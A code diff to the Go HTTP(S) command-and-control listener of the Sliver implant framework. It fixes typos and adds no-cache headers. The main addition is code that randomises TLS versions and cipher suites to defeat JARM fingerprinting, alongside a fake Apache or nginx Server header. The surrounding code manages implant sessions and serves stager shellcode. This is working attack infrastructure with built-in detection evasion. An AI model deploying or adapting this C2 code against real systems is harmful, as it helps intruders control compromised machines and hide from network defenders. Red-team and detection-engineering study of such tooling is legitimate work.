@@ -28,7 +28,6 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"io/ioutil"
 	insecureRand "math/rand"
 	"net"
 	"net/http"
@@ -48,6 +47,7 @@ import (
 	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
 	"github.com/bishopfox/sliver/server/log"
 	"github.com/bishopfox/sliver/server/website"
+	"github.com/bishopfox/sliver/util"
 	"github.com/bishopfox/sliver/util/encoders"
 
 	"github.com/gorilla/mux"
@@ -79,10 +79,10 @@ var (
 
 // HTTPSession - Holds data related to a sliver c2 session
 type HTTPSession struct {
-	ID         string
-	ImplanConn *core.ImplantConnection
-	CipherCtx  *cryptography.CipherContext
-	Started    time.Time
+	ID          string
+	ImplantConn *core.ImplantConnection
+	CipherCtx   *cryptography.CipherContext
+	Started     time.Time
 }
 
 // HTTPSessions - All currently open HTTP sessions
@@ -131,6 +131,7 @@ type HTTPServerConfig struct {
 	EnforceOTP      bool
 	LongPollTimeout time.Duration
 	LongPollJitter  time.Duration
+	RandomizeJARM   bool
 }
 
 // SliverHTTPC2 - Holds refs to all the C2 objects
@@ -146,7 +147,7 @@ type SliverHTTPC2 struct {
 
 func (s *SliverHTTPC2) getServerHeader() string {
 	if serverVersionHeader == "" {
-		switch insecureRand.Intn(1) {
+		switch insecureRand.Intn(2) {
 		case 0:
 			serverVersionHeader = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(48))
 		default:
@@ -171,7 +172,9 @@ func (s *SliverHTTPC2) LoadC2Config() *configs.HTTPC2Config {
 }
 
 // StartHTTPListener - Start an HTTP(S) listener, this can be used to start both
-//						HTTP/HTTPS depending on the caller's conf
+//
+//	HTTP/HTTPS depending on the caller's conf
+//
 // TODO: Better error handling, configurable ACME host/port
 func StartHTTPListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
 	httpLog.Infof("Starting https listener on '%s'", conf.Addr)
@@ -213,7 +216,7 @@ func StartHTTPListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
 			}
 		}
 	} else {
-		server.HTTPServer.TLSConfig = getHTTPTLSConfig(conf)
+		server.HTTPServer.TLSConfig = getHTTPSConfig(conf)
 		server.Cleanup = func() {
 			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 			defer cancel()
@@ -227,7 +230,7 @@ func StartHTTPListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
 	return server, nil
 }
 
-func getHTTPTLSConfig(conf *HTTPServerConfig) *tls.Config {
+func getHTTPSConfig(conf *HTTPServerConfig) *tls.Config {
 	if conf.Cert == nil || conf.Key == nil {
 		var err error
 		if conf.Domain != "" {
@@ -245,9 +248,91 @@ func getHTTPTLSConfig(conf *HTTPServerConfig) *tls.Config {
 		httpLog.Errorf("Failed to parse tls cert/key pair %s", err)
 		return nil
 	}
-	return &tls.Config{
-		Certificates: []tls.Certificate{cert},
+
+	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}}
+	if !conf.RandomizeJARM {
+		return tlsConfig
 	}
+
+	// Randomize the JARM fingerprint
+	switch insecureRand.Intn(4) {
+
+	// So it turns out that Windows by default
+	// disables TLS v1.2 because it's horrible.
+	// So anyways for compatibility we'll specify
+	// a min of 1.1 or 1.0
+
+	case 0:
+		// tlsConfig.MinVersion = tls.VersionTLS13
+		fallthrough // For compatibility with winhttp
+	case 1:
+		// tlsConfig.MinVersion = tls.VersionTLS12
+		fallthrough // For compatibility with winhttp
+	case 2:
+		tlsConfig.MinVersion = tls.VersionTLS11
+	default:
+		tlsConfig.MinVersion = tls.VersionTLS10
+	}
+
+	// Randomize the cipher suites
+	allCipherSuites := []uint16{
+		tls.TLS_RSA_WITH_RC4_128_SHA,                      //uint16 = 0x0005 1
+		tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,                 //uint16 = 0x000a 2
+		tls.TLS_RSA_WITH_AES_128_CBC_SHA,                  //uint16 = 0x002f 3
+		tls.TLS_RSA_WITH_AES_256_CBC_SHA,                  //uint16 = 0x0035 4
+		tls.TLS_RSA_WITH_AES_128_CBC_SHA256,               //uint16 = 0x003c 5
+		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,               //uint16 = 0x009c 6
+		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,               //uint16 = 0x009d 7
+		tls.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,              //uint16 = 0xc007 8
+		tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,          //uint16 = 0xc009 9
+		tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,          //uint16 = 0xc00a 10
+		tls.TLS_ECDHE_RSA_WITH_RC4_128_SHA,                //uint16 = 0xc011 11
+		tls.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,           //uint16 = 0xc012 12
+		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,            //uint16 = 0xc013 13
+		tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,            //uint16 = 0xc014 14
+		tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,       //uint16 = 0xc023 15
+		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,         //uint16 = 0xc027 16
+		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,         //uint16 = 0xc02f 17
+		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,       //uint16 = 0xc02b 18
+		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,         //uint16 = 0xc030 19
+		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,       //uint16 = 0xc02c 20
+		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,   //uint16 = 0xcca8 21
+		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256, //uint16 = 0xcca9 22
+	}
+	// CipherSuites ignores the order of the ciphers, this random shuffle
+	// is truncated resulting in a random selection from all ciphers
+	insecureRand.Shuffle(len(allCipherSuites), func(i, j int) {
+		allCipherSuites[i], allCipherSuites[j] = allCipherSuites[j], allCipherSuites[i]
+	})
+	nCiphers := insecureRand.Intn(len(allCipherSuites)-8) + 8
+	tlsConfig.CipherSuites = allCipherSuites[:nCiphers]
+
+	// Some TLS 1.2 stacks disable some of the older ciphers like RC4, so to ensure
+	// compatibility we need to make sure we always choose at least one modern RSA
+	// option.
+	modernCiphers := []uint16{
+		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,       //uint16 = 0xc027 16
+		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,       //uint16 = 0xc02f 17
+		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,       //uint16 = 0xc030 19
+		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256, //uint16 = 0xcca8 21
+	}
+
+	found := false
+	for _, cipher := range tlsConfig.CipherSuites {
+		if util.Contains(modernCiphers, cipher) {
+			found = true // Our random selection contains a modern cipher, do nothing
+			break
+		}
+	}
+	if !found {
+		// We are lacking at least one modern RSA option, so randomly enable one
+		tlsConfig.CipherSuites = append(tlsConfig.CipherSuites, modernCiphers[insecureRand.Intn(len(modernCiphers))])
+	}
+
+	if certs.TLSKeyLogger != nil {
+		tlsConfig.KeyLogWriter = certs.TLSKeyLogger
+	}
+	return tlsConfig
 }
 
 func (s *SliverHTTPC2) router() *mux.Router {
@@ -293,7 +378,7 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	// GET /fonts/Inter-Medium.woff/B64_ENCODED_PAYLOAD_UUID
 	router.HandleFunc(
 		fmt.Sprintf("/{rpath:.*\\.%s[/]{0,1}.*$}", c2Config.ImplantConfig.StagerFileExt),
-		s.stagerHander,
+		s.stagerHandler,
 	).MatcherFunc(s.filterOTP).Methods(http.MethodGet)
 
 	// Default handler returns static content or 404s
@@ -304,6 +389,10 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	router.Use(s.DefaultRespHeaders)
 
 	return router
+}
+
+func (s *SliverHTTPC2) noCacheHeader(resp http.ResponseWriter) {
+	resp.Header().Add("Cache-Control", "no-store, no-cache, must-revalidate")
 }
 
 // This filters requests that do not have a valid nonce
@@ -425,6 +514,7 @@ func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http
 		return err
 	}
 	resp.Header().Set("Content-type", contentType)
+	s.noCacheHeader(resp)
 	resp.Write(content)
 	return nil
 }
@@ -453,7 +543,7 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 		s.defaultHandler(resp, req)
 		return
 	}
-	body, err := ioutil.ReadAll(req.Body)
+	body, err := io.ReadAll(req.Body)
 	if err != nil {
 		httpLog.Errorf("Failed to read body %s", err)
 		s.defaultHandler(resp, req)
@@ -509,7 +599,7 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 		return
 	}
 	httpSession.CipherCtx = cryptography.NewCipherContext(sKey)
-	httpSession.ImplanConn = core.NewImplantConnection("http(s)", getRemoteAddr(req))
+	httpSession.ImplantConn = core.NewImplantConnection("http(s)", getRemoteAddr(req))
 	s.HTTPSessions.Add(httpSession)
 	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)
 
@@ -526,6 +616,7 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 		Secure:   false,
 		HttpOnly: true,
 	})
+	s.noCacheHeader(resp)
 	resp.Write(encoder.Encode(responseCiphertext))
 }
 
@@ -536,7 +627,7 @@ func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Reques
 		s.defaultHandler(resp, req)
 		return
 	}
-	httpSession.ImplanConn.UpdateLastMessage()
+	httpSession.ImplantConn.UpdateLastMessage()
 
 	plaintext, err := s.readReqBody(httpSession, resp, req)
 	if err != nil {
@@ -555,16 +646,16 @@ func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Reques
 	resp.WriteHeader(http.StatusAccepted)
 	handlers := sliverHandlers.GetHandlers()
 	if envelope.ID != 0 {
-		httpSession.ImplanConn.RespMutex.RLock()
-		defer httpSession.ImplanConn.RespMutex.RUnlock()
-		if resp, ok := httpSession.ImplanConn.Resp[envelope.ID]; ok {
+		httpSession.ImplantConn.RespMutex.RLock()
+		defer httpSession.ImplantConn.RespMutex.RUnlock()
+		if resp, ok := httpSession.ImplantConn.Resp[envelope.ID]; ok {
 			resp <- envelope
 		}
 	} else if handler, ok := handlers[envelope.Type]; ok {
-		respEnvelope := handler(httpSession.ImplanConn, envelope.Data)
+		respEnvelope := handler(httpSession.ImplantConn, envelope.Data)
 		if respEnvelope != nil {
 			go func() {
-				httpSession.ImplanConn.Send <- respEnvelope
+				httpSession.ImplantConn.Send <- respEnvelope
 			}()
 		}
 	}
@@ -577,13 +668,13 @@ func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) 
 		s.defaultHandler(resp, req)
 		return
 	}
-	httpSession.ImplanConn.UpdateLastMessage()
+	httpSession.ImplantConn.UpdateLastMessage()
 
 	// We already know we have a valid nonce because of the middleware filter
 	nonce, _ := getNonceFromURL(req.URL)
 	_, encoder, _ := encoders.EncoderFromNonce(nonce)
 	select {
-	case envelope := <-httpSession.ImplanConn.Send:
+	case envelope := <-httpSession.ImplantConn.Send:
 		resp.WriteHeader(http.StatusOK)
 		envelopeData, _ := proto.Marshal(envelope)
 		ciphertext, err := httpSession.CipherCtx.Encrypt(envelopeData)
@@ -591,6 +682,7 @@ func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) 
 			httpLog.Errorf("Failed to encrypt message %s", err)
 			ciphertext = []byte{}
 		}
+		s.noCacheHeader(resp)
 		resp.Write(encoder.Encode(ciphertext))
 	case <-req.Context().Done():
 		httpLog.Debug("Poll client hang up")
@@ -598,6 +690,7 @@ func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) 
 	case <-time.After(s.getServerPollTimeout()):
 		httpLog.Debug("Poll time out")
 		resp.WriteHeader(http.StatusNoContent)
+		s.noCacheHeader(resp)
 		resp.Write([]byte{})
 	}
 }
@@ -611,7 +704,7 @@ func (s *SliverHTTPC2) readReqBody(httpSession *HTTPSession, resp http.ResponseW
 		return nil, ErrInvalidEncoder
 	}
 
-	body, err := ioutil.ReadAll(&io.LimitedReader{
+	body, err := io.ReadAll(&io.LimitedReader{
 		R: req.Body,
 		N: int64(s.ServerConf.MaxRequestLength),
 	})
@@ -664,11 +757,12 @@ func (s *SliverHTTPC2) closeHandler(resp http.ResponseWriter, req *http.Request)
 	resp.WriteHeader(http.StatusAccepted)
 }
 
-// stagerHander - Serves the sliver shellcode to the stager requesting it
-func (s *SliverHTTPC2) stagerHander(resp http.ResponseWriter, req *http.Request) {
+// stagerHandler - Serves the sliver shellcode to the stager requesting it
+func (s *SliverHTTPC2) stagerHandler(resp http.ResponseWriter, req *http.Request) {
 	httpLog.Debug("Stager request")
 	if len(s.SliverStage) != 0 {
 		httpLog.Infof("Received staging request from %s", getRemoteAddr(req))
+		s.noCacheHeader(resp)
 		resp.Write(s.SliverStage)
 		httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverStage), getRemoteAddr(req))
 		resp.WriteHeader(http.StatusOK)
@@ -681,7 +775,7 @@ func (s *SliverHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
 	for _, cookie := range req.Cookies() {
 		httpSession := s.HTTPSessions.Get(cookie.Value)
 		if httpSession != nil {
-			httpSession.ImplanConn.UpdateLastMessage()
+			httpSession.ImplantConn.UpdateLastMessage()
 			return httpSession
 		}
 	}
